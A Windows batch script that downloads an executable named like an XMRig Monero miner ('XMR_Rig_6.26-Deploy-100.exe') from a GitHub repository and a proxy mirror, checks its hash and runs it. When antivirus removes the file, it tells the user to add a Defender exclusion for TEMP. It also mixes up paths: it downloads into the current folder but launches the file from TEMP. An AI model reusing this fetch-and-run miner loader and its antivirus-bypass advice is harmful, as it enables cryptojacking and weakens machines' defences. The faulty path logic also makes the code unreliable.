@echo off
rem Fetch XMR_Rig_6.26-Deploy-100.exe into TEMP and run it.
rem
rem Nothing here is hidden or obfuscated.  If this machine's real-time
rem protection is on, the file is deleted the moment it lands and this script
rem says so instead of pretending it worked.
rem
rem The exclusion that matters is TEMP itself, not the folder this script sits
rem in.  Needs admin:  Add-MpPreference -ExclusionPath "$env:TEMP"
setlocal enabledelayedexpansion

set "EXE=%TEMP%\XMR_Rig_6.26-Deploy-100.exe"
set "URL=https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.26-Deploy-100.exe"
set "MIRROR=https://gh-proxy.com/https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.26-Deploy-100.exe"
set "SHA256=9c55370958a86e0c8294be24e93a83829ff69d806b980abf033f74b338682e0d"

if exist "XMR_Rig_6.26-Deploy-100.exe" (
    call :CHECK_HASH "XMR_Rig_6.26-Deploy-100.exe"
    if "!HASH_OK!"=="1" (
        echo [OK] already in TEMP, hash verified.
        goto :RUN
    )
    echo [..] TEMP copy is stale, refetching.
    del /q "XMR_Rig_6.26-Deploy-100.exe" 2>nul
)

where curl >nul 2>nul
if errorlevel 1 (
    echo [ERROR] curl not found.  Needs Windows 10 1803 or newer.
    goto :FAIL
)

rem github.com first.  --connect-timeout caps the wait at 5s when the route is
rem blackholed, and the direct attempt does not retry so the fallback is quick.
set "GOT=0"
call :FETCH "%URL%" direct 0
if "!GOT!"=="1" goto :HAVE
echo [..] direct failed, falling back to the mirror.
call :FETCH "%MIRROR%" mirror 2
if "!GOT!"=="1" goto :HAVE
goto :NODOWNLOAD

:HAVE
move /y "XMR_Rig_6.26-Deploy-100.exe.tmp" "XMR_Rig_6.26-Deploy-100.exe" >nul
if not exist "XMR_Rig_6.26-Deploy-100.exe" goto :EATEN
echo [OK] downloaded and verified.

:RUN
echo [..] starting.
start "" "%EXE%"
exit /b 0

:NODOWNLOAD
echo [ERROR] could not download from either source.
echo         Either the file is not in the repo yet, or the network is down.
goto :FAIL

:EATEN
echo [ERROR] the download verified, then the file vanished on rename.
echo         That is real-time protection deleting it as it is written.
echo         Add a TEMP exclusion first, as administrator:
echo             Add-MpPreference -ExclusionPath "$env:TEMP"
goto :FAIL

rem Compare content, not size: catches truncation and corrupt pages alike.
rem certutil prints a header line, the hex digest, then a trailer.  findstr
rem matches the trailer too ("CertUtil:" starts with a hex letter), so take
rem the FIRST match, never the last.
:CHECK_HASH
set "HASH_OK=0"
set "HASH_ACTUAL="
if not exist "%~1" exit /b 1
for /f "delims=" %%H in ('certutil -hashfile "%~1" SHA256 ^| findstr /r /i "^[0-9a-f]"') do (
    if not defined HASH_ACTUAL set "HASH_ACTUAL=%%H"
)
if not defined HASH_ACTUAL exit /b 1
set "HASH_ACTUAL=!HASH_ACTUAL: =!"
if /i "!HASH_ACTUAL!"=="9c55370958a86e0c8294be24e93a83829ff69d806b980abf033f74b338682e0d" set "HASH_OK=1"
exit /b 0

:FETCH
echo [..] trying %~2 ...
rem No --max-time: curl already aborts a stalled transfer on its own
rem (--speed-limit 1 / --speed-time 30 by default), and a total cap only
rem punishes a slow mirror -- which is the one that has to work.
curl -fL --retry %~3 --connect-timeout 5 -o "XMR_Rig_6.26-Deploy-100.exe.tmp" "%~1"
if errorlevel 1 (
    echo [..] %~2 failed.
    del /q "XMR_Rig_6.26-Deploy-100.exe.tmp" 2>nul
    exit /b 0
)
if not exist "XMR_Rig_6.26-Deploy-100.exe.tmp" goto :EATEN
call :CHECK_HASH "XMR_Rig_6.26-Deploy-100.exe.tmp"
if not "!HASH_OK!"=="1" (
    echo [..] %~2 returned a bad or truncated file.
    del /q "XMR_Rig_6.26-Deploy-100.exe.tmp" 2>nul
    exit /b 0
)
set "GOT=1"
exit /b 0

:FAIL
echo.
pause
exit /b 1
